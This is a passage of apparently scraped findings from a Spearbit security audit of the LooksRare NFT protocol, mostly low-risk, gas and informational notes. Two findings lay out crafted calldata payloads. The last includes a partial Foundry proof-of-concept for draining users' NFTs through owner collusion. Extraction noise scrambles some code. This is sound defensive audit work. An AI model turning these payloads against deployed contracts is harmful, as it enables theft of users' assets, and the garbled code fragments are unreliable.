"https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "This protocol seems to have a fee structure where both the protocol and the original creator of the item are charging fees, and these fees are being subtracted from the seller's fee. This means that the seller, whether they are a maker or a taker, may receive a lower price than they expected due to sudden changes in creator or protocol fee rates.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "StrategyManager does not emit an event when the first strategy gets added.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "StrategyManager does not emit an event when the first strategy gets added which can cause issues for off-chain agents.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "TransferSelectorNFT does not emit events when new transfer managers are added in its construc- tor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "TransferSelectorNFT does not emit an event when assetTypes of 0 and 1 are added in its con- structor.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Protocol fees will be sent to address(0) if protocolFeeRecipient is not set.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Protocol fees will be sent to address(0) if protocolFeeRecipient is not set.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "The returned price by strategies are not validated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "When a taker submits an order to be executed, the returned price by the maker's chosen strategy is not validated. The current strategies do have the validations implemented. But the general upper and lower bound price validation would need to be in the protocol contract itself since the price calculation in a potential strategy might be a complex matter that cannot be easily verified by a maker or a taker. Related issue: \"price validation in executeStrategyWithTakerAsk, executeCollectionStrategyWithTakerAsk and ex- ecuteCollectionStrategyWithTakerAskWithProof can be relaxed\"", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Makers can sign (or be tricked into signing) collection of orders (using the merkle tree mechanism) that cannot be entirely canceled.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "All user-facing order execution endpoints of the protocol check whether the order hash is included in the merkle tree data provided by the caller. If it is, the maker/signer is only required to sign the hash of the tree's root. A maker might sign (or get tricked into signing) a root that belongs to trees with a high number of leaves such that the leaves each encode an order with  Different subsetNonce and orderNonce (this would require canceling each nonce individually if the relevant endpoints are used).  askNonce or bidNonce that form a consecutive array of intergers ( 1, (cid:1) (cid:1) (cid:1) , n ) (this would require incrementing these nonces at least n times, if this method was used as a way of canceling the orders). To cancel these orders, the maker would need to call the cancelOrderNonces, cancelSubsetNonces, or incre- mentBidAskNonces. If the tree has a high number of nodes, it might be infeasible to cancel all the orders due to gas costs. The maker would be forced to remove its token approvals (if it's not a custom EIP-1271 maker/signer) and not use that address again to interact with the protocol.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "The ItemIdsRange strategy allows for length mismatch in itemIds and amounts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "There is no validation that takerAsk.itemIds.length == takerAsk.amounts.length in the ItemIdsRange strategy, despite takerAsk.itemIds and takerAsk.amounts being the return values of the executeStrategyWithTakerAsk function. If takerAsk.itemIds.length > takerAsk.amounts.length, then the transaction will revert anyways when it attempts to read an index out of bounds in the main loop. However, there is nothing causing a revert if takerAsk.itemIds.length < takerAsk.amounts.length, and any extra values in the takerAsk.amounts array will be ignored. Most likely this issue would be caught later on in any transaction, e.g. the current TransferManager implementation checks for length mismatches. However, this TransferManager is just one possible implementation that could be added to the TransferSelectorNFT contract, so this still could be an issue.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Spec mismatch - StrategyCollectionOffer allows the only single item orders where the spec states it should allow any amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Proof only allow the transfer of a single ERC721/ERC1155 item, although the specification states it should support any amount.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Owner of strategies that inherit from BaseStrategyChainlinkMultiplePriceFeeds can add mali- cious price feeds after they have been added to LooksRareProtocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Owner of strategies that inherit from BaseStrategyChainlinkMultiplePriceFeeds can add mali- cious price feeds for new collections after they have been added to LooksRareProtocol. It's also important to note that these strategy owners might not neccessarily be the same owner as the LooksRareProtocol's. 1. LooksRareProtocol's OL adds strategy S. 2. Stragey's owner OS adds a malicous price feed for a new collection T .", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "The price calculation in StrategyDutchAuction can be more accurate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "StrategyDutchAuction calculates the auction price as uint256 duration = makerAsk.endTime - makerAsk.startTime; uint256 decayPerSecond = (startPrice - makerAsk.minPrice) / duration; uint256 elapsedTime = block.timestamp - makerAsk.startTime; price = startPrice - elapsedTime * decayPerSecond; One of the shortcomings of the above calculation is that division comes before multiplication which can amplify the error due to division.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Incorrect isMakerBidValid logic in ItemIdsRange execution strategy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "If an ItemIdsRange order has makerBid.itemIds[0] == 0, it is treated as invalid by the corre- sponding isMakerBidValid function. Since makerBid.itemIds[0] is the minItemId value, and since many NFT collections contain NFTs with id 0, this is incorrect (and does not match the logic of the ItemIdsRange executeS- trategyWithTakerAsk function). As a consequence, frontends that filter orders based on the isMakerBidValid function will ignore certain orders, even though they are valid.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Restructure struct definitions in OrderStructs in a more optimized format", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Maker and taker ask and bid structs include the fields itemIds and amounts. For most strategies, these two arrays are supposed to have the same length (except for StrategyItemIdsRange). Even for Strate- gyItemIdsRange one can either:  Relax the requirement that makerBid.amounts.length == 1 (be replaced by amounts and itemIds length to be equal to 2 ) by allowing an unused extra amount or  not use the makerBid.amounts and makerBid.itemIds and instead grab those 3 parameters from the addi- tionalParameters field. This might actually make more sense since in the case of StrategyItemIdsRange, the itemIds and amounts carry information that deviates from what they are intended to be used for.", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "if/else block in executeMultipleTakerBids can be simplified/optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "if/else block in executeMultipleTakerBids can be simplified/optimized by using the continue keyword and placing the else's body in the outer scope. // If atomic, it uses the executeTakerBid function, if not atomic, it uses a catch/revert pattern with external function ,! if (isAtomic) { // Execute the transaction and add protocol fee totalProtocolFeeAmount += _executeTakerBid(takerBid, makerAsk, msg.sender, orderHash); unchecked { ++i; } continue; } try this.restrictedExecuteTakerBid(takerBid, makerAsk, msg.sender, orderHash) returns ( uint256 protocolFeeAmount ) { totalProtocolFeeAmount += protocolFeeAmount; } catch {} unchecked { ++i; } testThreeTakerBidsERC721OneFails() (gas: -24 (-0.002%)) Overall gas change: -24 (-0.002%) LooksRare: Fixed in PR 323. Spearbit: Verified.", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "Cache currency in executeTakerAsk and executeTakerBid", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "currency is read multiple times from calldata in executeTakerAsk and executeTakerBid.", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "Cache operators[i] in grantApprovals and revokeApprovals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "operators[i] is used 3 times in grantApprovals's (and twice in revokeApprovals) for loop.", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "recipients[0] is never used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "recipients[0] is set to protocolFeeRecipient. But its value is never used afterward. payProtocolFeeAndAffiliateFee, the fees[0] amount is manually distributed to an affiliate if any and the pro- tocolFeeRecipient.", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "currency validation can be optimized/refactored", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the context above we are enforcing only native tokens or WETH to be supplied. The if statement can be simplified and refactored into a utility function (possibly defined in either BaseStrategy or in BaseStrate- gyChainlinkPriceLatency): if (makerAsk.currency != address(0)) { if (makerAsk.currency != WETH) { revert WrongCurrency(); } }", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "validating amount can be simplified and possibly refactored", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the context above, we are trying to invalidate orders that have 0 amounts or an amount other than 1 when the asset if an ERC721 if (amount != 1) { if (amount == 0) { revert OrderInvalid(); } if (assetType == 0) { revert OrderInvalid(); } } The above snippet can be simplified into: if (amount == 0 or (amount != 1 and assetType == 0)) { revert OrderInvalid(); }", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "_verifyMatchingItemIdsAndAmountsAndPrice can be further optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "_verifyMatchingItemIdsAndAmountsAndPrice's validation logic uses more opcodes than is neces- sary. Also, the whole function can be turned into an assembly block to further optimized this function. Examples of simplifications for if conditions or(X, gt(Y, 0)) or(X, Y) // simplified version or(X, iszero(eq(Y,Z))) or(X, xor(Y, Z)) // simplified version The nested if block below if (amount != 1) { if (amount == 0) { revert OrderInvalid(); } if (assetType == 0) { revert OrderInvalid(); } } can be simplified into 33 if (amount == 0) { revert OrderInvalid(); } if ((amount != 1) && (assetType == 0)) { revert OrderInvalid(); }", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "In StrategyFloorFromChainlink premium amounts miss the related checks when compared to checks for discount amounts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "For discount amounts, StrategyFloorFromChainlink has custom checks for the underflows (even though they will be caught by the compiler): 36 if (floorPrice <= discountAmount) { revert DiscountGreaterThanFloorPrice(); } uint256 desiredPrice = floorPrice - discountAmount; ... // @dev Discount cannot be 100% if (discount >= 10_000) { revert OrderInvalid(); } uint256 desiredPrice = (floorPrice * (10_000 - discount)) / 10_000; Similar checks for overflows for the premium are missing in the execution and validation endpoints (even though they will be caught by the compiler, floorPrice + premium or 10_000 + premium might overflow).", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "StrategyFloorFromChainlink's isMakerBidValid compare the time dependent floorPrice to a fixed discount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "When isMakerBidValid gets called depending on the market conditions at that specific time the comparisons between the floorPrice and the discount might cause this function to either return isValid as true or false.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "StrategyFloorFromChainlink's isMakerAskValid does not validate makerAsk.additionalParameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "For executeFixedPremiumStrategyWithTakerBid and executeBasisPointsPremiumStrategy- WithTakerBid, maker needs to make sure to populate its additionalParameters with the premium amount, otherwise the taker's transactions would revert: makerAsk.additionalParameters = abi.encode(premium); isMakerAskValid does not check whether makerAsk.additionalParameters has 32 as its length. For example, the validation endpoint for StrategyCollectionOffer does check this for the merkle root.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "StrategyFloorFromChainlink strategies do not check for asset types explicitly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "StrategyFloorFromChainlink has 4 different execution endpoints:  executeFixedPremiumStrategyWithTakerBid  executeBasisPointsPremiumStrategyWithTakerBid  executeFixedDiscountCollectionOfferStrategyWithTakerAsk  executeBasisPointsDiscountCollectionOfferStrategyWithTakerAsk All these endpoints require that only one amount to be passed (asked for or bid on) and that amount would need to be 1. This is in contrast to StrategyCollectionOffer strategy that allows an arbitrary amount (although also required to be only one amount, [a]) Currently, Chainlink only provides price feeds for a selected list of ERC721 collections: https://docs.chain.link/ data-feeds/nft-floor-price/addresses So, if there are no price feeds for ERC1155 (as of now), the transaction would revert. Thus implicitly one can deduce that the chainlink floor strategies are only implemented for ERC721 tokens. Other strategies condition the amounts based on the assetType: 38  assetType == 0 or ERC721 collections can only have 1 as a valid amount  assetType == 0 or ERC1155 collections can only have a non-zero number as a valid amount If in the future chainlink or another token-price-feed adds support for some ERC1155 collections, one cannot use the current floor strategies to fulfill an order with an amount greater than 1.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "itemIds and amounts are redundant fields for takerXxx struct", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Taker is the entity that initiates the calls to LooksRareProtocol's 3 order execution endpoints. Most implemented strategies (which are fixed/chosen by the maker through signing the makerXxx which includes the strategyId) require the itemIds and amounts fields for the maker and the taker to mirror each other. i : the j th element of maker's itemIds fields (the struct would be either MakerBid or MakerAsk depending  M j on the context)  M j a : the j th element of maker's amounts fields (the struct would be either MakerBid or MakerAsk depending on the context)  T j i : the j th element of taker's itemIds fields (the struct would be either TakerBid or TakerAsk depending on the context)  T j a : the j th element of taker's amounts fields (the struct would be either TakerBid or TakerAsk depending on the context) Borrowing notations also from:  \"Constraints among the number of item ids and amounts for taker or maker bids or asks are inconsistent among different strategies\"  IneheritedStategy : T j i = M j  StrategyDutchAuction : T j i , T j i = M j a = M j a i , T j a = M j a , taker can send extra itemIds and amounts but they won't be  StrategyUSDDynamicAsk : T j i = M j i , T j a = M j a , taker can send extra itemIds and amounts but they won't be used. used.  StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid : T 0 i = M 0 i , T 0 a = M 0 a = 1 , taker can send extra itemIds and amounts but they won't be used.  StrategyFloorFromChainlink.execute...DiscountCollectionOfferStrategyWithTakerAsk : T 0 a = M 0 a = 1 , maker's itemIds are unused.  StrategyCollectionOffer : T 0 a = M 0 a , maker's itemIds are unused and taker's T i a for i > 0 are also unused.  StrategyItemIdsRange : M 0 i (cid:20) T j i (cid:20) M 1 i , P T j a = M 0 a . 39 For  IneheritedStategy  StrategyDutchAuction  StrategyUSDDynamicAsk  StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid Shared taker's itemIds and amounts are redundant as they should exactly match maker's fields. For the other strategies, one can encode the required parameters in either maker's or taker's additionalParameters fields.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "discount == 10_000 is not allowed in executeBasisPointsDiscountCollectionOfferStrategyWith- TakerAsk", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "executeBasisPointsDiscountCollectionOfferStrategyWithTakerAsk reverts if discount == 10_000, but does not if discount == 99_99 which almost has the same effect. Note that if discount == 10_000, (forgetting about the revert) price = desiredPrice = 0. So, unless the taker (sender of the transaction) has set its takerAsk.minPrice to 0 (maker is bidding for a 100% discount and taker is gifting the NFT), the transaction would revert: if (takerAsk.minPrice > price) { // takerAsk.minPrice > 0 revert AskTooHigh(); }", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Restructure executeMultipleTakerBids's input parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "executeMultipleTakerBids has the following form function executeMultipleTakerBids( OrderStructs.TakerBid[] calldata takerBids, OrderStructs.MakerAsk[] calldata makerAsks, bytes[] calldata makerSignatures, OrderStructs.MerkleTree[] calldata merkleTrees, address affiliate, bool isAtomic ) For the input parameters provided, we need to make sure takerBids, makerAsks, makerSignatures, and merkle- Trees all have the same length. We can enforce this requirement by definition, if we restructure the input passed to executeMultipleTakerBids.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Restructure transferBatchItemsAcrossCollections input parameter format", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "transferBatchItemsAcrossCollections has the following form function transferBatchItemsAcrossCollections( address[] calldata collections, uint256[] calldata assetTypes, address from, address to, uint256[][] calldata itemIds, uint256[][] calldata amounts ) where collections, assetTypes, itemIds and amounts are supposed to have the same lengths. One can enforce that by redefining the input parameter and have this invariant enforced by definition.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "An approved operator can call transferBatchItemsAcrossCollections", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "TransferManager has 3 endpoints that an approved operator can call:  transferItemsERC721  transferItemsERC1155  transferBatchItemsAcrossCollections The first 2 share the same input parameter types but differ from transferBatchItemsAcrossCollections: , address transferItemsERC1155 address ,! address[], address[], address, address , uint256[][], uint256[][] // ,! transferBatchItemsAcrossCollections , address, uint256[], uint256[] // transferItemsERC721, 44 An operator like LooksRareProtocol might have an owner ( OL ) that can select/add arbitrary endpoint of this transfer manager for an asset type, but only call the transfer manager using the same input parameter types regardless of the added endpoint. So in this case, OL might add a new asset type with TransferManager.transferBatchItemsAcrossCollections.selector as the selector and this transfer manager as the manager. Now, since this operator/LooksRareProtocol (and possibly other future implementations of approved operators) uses the same list of parameters for all endpoints, when _transferNFT gets called, the transfer manager using the transferBatchItemsAcrossCollections endpoint but with the following encoded data: the protocol would call abi.encodeWithSelector( managerSelectorOfAssetType[assetType].selector, collection, sender, recipient, itemIds, amounts ) ) A crafty OL might try to take advantage of the parameter type mismatch to create a malicious payload (address, address, address, uint256[], uint256[] ) that when decoded as (address[], address[], address, address, uint256[][], uint256[][]) It would allow them to transfer any NFT tokens from any user to some specific users. ; interpreted paramters | original parameter ,! ; ---------------------------------- ,! -------- c Ma.s or msg.sender 00000000000000000000000000000000000000000000000000000000000000c0 ; collections.ptr 0000000000000000000000000000000000000000000000000000000000000100 ; assetTypes.ptr ,! 00000000000000000000000000000000000000000000000000000000000000X3 ; from ,! 00000000000000000000000000000000000000000000000000000000000000X4 ; to ,! itemIds.ptr -> 0xa0 Tb.r or Mb.s x 0000000000000000000000000000000000000000000000000000000000000140 ; itemIds.ptr ,! amounts.ptr -> 0xc0 + 0x20 * itemIds.length 00000000000000000000000000000000000000000000000000000000000001c0 ; amounts.ptr ,! itemIds.length | collection | from / | to / | | | ; ; | itemIds[0] | itemIds[1] ... Fortunately, that is not possible since in this particular instance the transferItemsERC721 and transferItem- sERC1155's amounts's calldata tail pointer always coincide with transferBatchItemsAcrossCollections's itemIds's calldata tail pointer (uint256[] amounts, uint256[][] itemIds) which unless both have length 0 it would cause the compiled code to revert due to out of range index access. This is also dependent on if/how the compiler encodes/decodes the calldata and if the compiler would add the bytecodes for the deployed code to revert for OOR accesses (which solc does). This is just a lucky coincidence otherwise, OT could have exploited this flaw.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Shared login in different StrategyFloorFromChainlink strategies can be refactored", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": " executeFixedPremiumStrategyWithTakerBid and executeBasisPointsPremiumStrategyWithTakerBid.  executeFixedDiscountCollectionOfferStrategyWithTakerAsk and executeBasisPointsDiscountCol- lectionOfferStrategyWithTakerAsk. Each group of endpoints in the above list share the exact same logic. The only difference they have is the formula and checks used to calculate the desiredPrice based on a given floorPrice and premium/discount. function a1(<INPUT_PARAMS>) external view returns (<OUTPUT_PARAMS>) { <PRE_COMMON_BLOCK> (<OUTER_PARAMS>) = _a1(<INTER_PARAMS>); // inlined computation of _a1 <POST_COMMON_BLOCK> } function a2(<INPUT_PARAMS>) external view returns (<OUTPUT_PARAMS>) { <PRE_COMMON_BLOCK> (<OUTER_PARAMS>) = _a2(<INTER_PARAMS>); // inlined computation of _a2 <POST_COMMON_BLOCK> }", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Setting protocol and ask fee amounts and recipients can be refactored in ExecutionManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Setting and calculating the protocol and ask fee amounts and recipients follow the same logic in _executeStrategyForTakerAsk and _executeStrategyForTakerBid.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Creator fee amount and recipient calculation can be refactored in ExecutionManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The create fee amount and recipient calculation in _executeStrategyForTakerAsk and _executeS- trategyForTakerBid are identical and can be refactored.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "The owner can set the selector for a strategy to any bytes4 value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The owner can set the selector for a strategy to any bytes4 value (as long as it's not bytes4(0)). Even though the following check exists if (!IBaseStrategy(implementation).isLooksRareV2Strategy()) { revert NotV2Strategy(); } There is no measure taken to avoid potential selector collision with other contract types.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Constraints among the number of item ids and amounts for taker or maker bids or asks are incon- sistent among different strategies.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Constraints among the number of item ids and amounts for taker or maker bids or asks are incon- sistent among different strategies. notation description Ti Ta Mi Ma length of taker's bid (or ask depending on the context) item ids length of taker's bid (or ask depending on the context) amounts length of maker's bid (or ask depending on the context) item ids length of maker's bid (or ask depending on the context) amounts 59  IneheritedStategy : Ti = Ta = Mi = Ma  StrategyItemIdsRange : Ti (cid:20) Ta, Mi = 2, Ma = 1 (related issue)  StrategyDutchAuction : Mi (cid:20) Ti , Ma (cid:20) Ta, Mi = Ma  StrategyUSDDynamicAsk: Mi (cid:20) Ti , Ma (cid:20) Ta, Mi = Ma  StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid : Mi (cid:20) Ti , Ma (cid:20) Ta, Mi = Ma = 1  StrategyFloorFromChainlink.execute...DiscountCollectionOfferStrategyWithTakerAsk : Ti = 1, 1 = Ta, Ma = 1  StrategyCollectionOffer : Ti = 1, 1 (cid:20) Ta, Ma = 1 The equalities above are explicitly enforced, but the inequalities are implicitly enforced through the compiler's out-of-bound revert. Note that in most cases (except StrategyItemIdsRange) one can enforce Ti = Ta = Mi = Ma and refactor this logic into a utility function.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Requirements/checks for adding new transfer managers (or strategies) are really important to avoid self-reentrancy through restrictedExecuteTakerBid from unexpected call sites", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "When a new transfer manager gets added to the protocol, there is a check to make sure that this manager cannot be the protocol itself. This is really important as restrictedExecuteTakerBid allows the protocol itself to call this endpoint. If the check below was omitted: if ( transferManagerForAssetType == address(0) || // transferManagerForAssetType == address(this) || selectorForAssetType == bytes4(0) ) { } revert ManagerSelectorEmpty(); The owner can add the protocol itself as a transfer manager for a new asset type and pick the selector to be ILooksRareProtocol.restrictedExecuteTakerBid.selector. Then the owner along with a special address can collude and drain users' NFT tokens from an actual approved transfer manager for ERC721/ERC1155 assets. The special feature of restrictedExecuteTakerBid is that once it's called the provided parameters by the maker are not checked/verified against any signatures. The PoC below includes 2 different custom strategies for an easier setup but they are not necessary (one can use the default strategy). One creates the calldata payload and the other is called later on to select a desired NFT token id. 60 The calldata to restrictedExecuteTakerBid(...) is crafted so that the corresponding desired parameters for an actual transferManager.call can be set by itemIds; parameters offset ,! ------------------------------------------------------------------------------------------------------- c ,! 0x0000 interpreted parameters ---------- | original msg.sender, , can be changed by stuffing 0s 0000000000000000000000000000000000000000000000000000000000000080 0000000000000000000000000000000000000000000000000000000000000180 ,! 00000000000000000000000000000000000000000000000000000000000000X1 ; sender ,! 00000000000000000000000000000000000000000000000000000000000000a0 ,! msg.sender / signer ho, orderHash, 0xa0 | collection | signer / | Ta.r or | i[] ptr 0x0080 ,! to, can be changed by stuffing 0s 00000000000000000000000000000000000000000000000000000000000000X2 ; Tb.r | a[] ptr , 0x0180 00000000000000000000000000000000000000000000000000000000000000X3 ; Tb.p_max 00000000000000000000000000000000000000000000000000000000000000a0 00000000000000000000000000000000000000000000000000000000000000c0 00000000000000000000000000000000000000000000000000000000000000e0 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 from 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000X4 ; sid 00000000000000000000000000000000000000000000000000000000000000X5 ; t 0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000X6 ; T 00000000000000000000000000000000000000000000000000000000000000X7 ; C 00000000000000000000000000000000000000000000000000000000000000X8 ; signer ,! 00000000000000000000000000000000000000000000000000000000000000X9 ; ts 00000000000000000000000000000000000000000000000000000000000000Xa ; te 0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000001c0 00000000000000000000000000000000000000000000000000000000000001e0 0000000000000000000000000000000000000000000000000000000000000200 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 | i[].len | i[0] | i[1] | i[2] | i[3] | i[4] | i[5] | i[6] | i[7] | i[8] | i[9] | i[10] | i[11] | i[12] | i[13] , | i[14] | i[15] | i[16] | i[17] | i[18] | i[19] | i[20] | i[21] | i[22] ; T = real_collection ; C = currency ; t = assetType ; sid = strategyId ; ts = startTime ; te = endTime ; Ta = takerAsk ; Tb = takerBid // file: test/foundry/AssetAttack.t.sol pragma solidity 0.8.17; import {IStrategyManager} from \"../../contracts/interfaces/IStrategyManager.sol\"; import {IBaseStrategy} from \"../../contracts/interfaces/IBaseStrategy.sol\"; import {OrderStructs} from \"../../contracts/libraries/OrderStructs.sol\"; import {ProtocolBase} from \"./ProtocolBase.t.sol\"; import {MockERC20} from \"../mock/MockERC20.sol\"; 61 interface IERC1271 { function isValidSignature( bytes32 digest, bytes calldata signature ) external returns (bytes4 magicValue); } contract PayloadStrategy is IBaseStrategy { address private owner; address private collection; address private currency; uint256 private assetType; address private signer; uint256 private nextStartegyId; constructor() { owner = msg.sender; } function set( address _collection, address _currency, uint256 _assetType, address _signer, uint256 _nextStartegyId ) external { if(msg.sender != owner) revert(); collection = _collection; currency = _currency; assetType = _assetType; signer = _signer; nextStartegyId = _nextStartegyId; } function isLooksRareV2Strategy() external pure override returns (bool) { return true; } function execute( OrderStructs.TakerBid calldata /* takerBid */ , OrderStructs.MakerAsk calldata /* makerAsk */ ) external view returns ( uint256 price, uint256[] memory itemIds, uint256[] memory amounts, bool isNonceInvalidated ) { itemIds = new uint256[](23); itemIds[0] = 0xa0; itemIds[1] = 0xc0; itemIds[2] = 0xe0; 62 itemIds[8] = nextStartegyId; itemIds[9] = assetType; itemIds[11] = uint256(uint160(collection)); itemIds[12] = uint256(uint160(currency)); itemIds[13] = uint256(uint160(signer)); itemIds[14] = 0; // startTime itemIds[15] = type(uint256).max; // endTime itemIds[17] = 0x01c0; itemIds[18] = 0x01e0; itemIds[19] = 0x0200; } } contract ItemSelectorStrategy is IBaseStrategy { address private owner; uint256 private itemId; uint256 private amount; constructor() { owner = msg.sender; } function set( uint256 _itemId, uint256 _amount ) external { if(msg.sender != owner) revert(); itemId = _itemId; amount = _amount; } function isLooksRareV2Strategy() external pure override returns (bool) { return true; } function execute( OrderStructs.TakerBid calldata /* takerBid */ , OrderStructs.MakerAsk calldata /* makerAsk */ external view returns ( uint256 price, uint256[] memory itemIds, uint256[] memory amounts, bool isNonceInvalidated ) itemIds = new uint256[](1); itemIds[0] = itemId; amounts = new uint256[](1); amounts[0] = amount; ) { } } contract AttackTest is ProtocolBase { PayloadStrategy private payloadStrategy; 63 ItemSelectorStrategy private itemSelectorStrategy; MockERC20 private mockERC20; // // can be an arbitrary address uint256 private signingOwnerPK = 42; address private signingOwner = vm.addr(signingOwnerPK); // this address will define an offset in the calldata // and can be changed up to a certain upperbound by // stuffing calldata with 0s. address private specialUser1 = address(0x180); // NFT token recipient of the attack can also be changed // up to a certain upper bound by stuffing the calldata with 0s address private specialUser2 = address(0x3a0); // can be an arbitrary address address private victimUser = address(505); function setUp() public override { super.setUp(); vm.startPrank(_owner); { looksRareProtocol.initiateOwnershipTransfer(signingOwner); } vm.stopPrank(); vm.startPrank(signingOwner); { looksRareProtocol.confirmOwnershipTransfer(); mockERC20 = new MockERC20(); looksRareProtocol.updateCurrencyWhitelistStatus(address(mockERC20), true); looksRareProtocol.updateCreatorFeeManager(address(0)); mockERC20.mint(victimUser, 1000); mockERC721.mint(victimUser, 1); // This particular strategy is not a requirement of the exploit. // it just makes it easier payloadStrategy = new PayloadStrategy(); looksRareProtocol.addStrategy( 0, 0, 0, PayloadStrategy.execute.selector, true, address(payloadStrategy) ); 